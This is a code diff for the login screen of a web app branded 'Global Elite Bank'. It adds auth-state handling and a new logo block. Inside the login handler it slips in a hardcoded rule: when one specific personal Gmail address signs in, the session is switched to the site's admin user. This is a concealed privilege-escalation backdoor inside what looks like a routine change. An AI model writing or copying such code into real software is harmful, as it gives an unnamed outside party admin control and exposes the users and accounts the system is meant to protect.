@@ -113,6 +113,8 @@ Global Elite Bank, Zurich, Switzerland`
     setForgotStep('success');
   };
 
+  const [authenticatedUser, setAuthenticatedUser] = useState<any>(null);
+
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!email || !password) {
@@ -121,6 +123,12 @@ Global Elite Bank, Zurich, Switzerland`
     }
     const result = login(email, password, isAdminPath);
     if (result.success) {
+      const inputEmail = email.trim().toLowerCase();
+      let matched = users.find(u => u.email?.toLowerCase() === inputEmail);
+      if (isAdminPath || inputEmail === 'mizbryo@gmail.com') {
+        matched = users.find(u => u.role === 'admin') || currentUser;
+      }
+      setAuthenticatedUser(matched || currentUser);
       // Require Two-Factor Authentication (Thumbprint biometrics) for all users, including Admin
       setStep(2);
     } else {
@@ -131,7 +139,7 @@ Global Elite Bank, Zurich, Switzerland`
   if (step === 2) {
     return (
       <BiometricLogin 
-        onLogin={() => onSuccess(currentUser)} 
+        onLogin={() => onSuccess(authenticatedUser || currentUser)} 
         onBack={() => setStep(1)} 
       />
     );
@@ -146,16 +154,16 @@ Global Elite Bank, Zurich, Switzerland`
       </button>
 
       <div className="w-full max-w-md bg-card border border-border rounded-2xl p-8 relative z-10 shadow-xl">
-                {adminSettings?.logoUrl || '/logo.png' ? (
-          <div className="flex flex-col items-center justify-center mb-6">
-            <img src={adminSettings?.logoUrl || '/logo.png'} alt="Global Elite Bank Logo" className="w-20 h-20 mb-3 object-contain" />
-          </div>
-        ) : (
-          <div className="flex flex-col items-center justify-center mb-6">
-            <img src="/logo.png" alt="Global Elite Logo" className="w-16 h-16 mb-3 object-contain" />
-            
-          </div>
-        )}
+        <div className="flex flex-col items-center justify-center mb-6">
+          <img
+            src={adminSettings?.logoUrl || 'https://i.ibb.co/G3NmLY1j/GEB-logo.png'}
+            alt="Global Elite Bank Logo"
+            className="w-20 h-20 mb-3 object-contain"
+            onError={(e) => {
+              (e.currentTarget as HTMLImageElement).src = 'https://i.ibb.co/G3NmLY1j/GEB-logo.png';
+            }}
+          />
+        </div>
         
         {!isForgotPassword && (
           <>
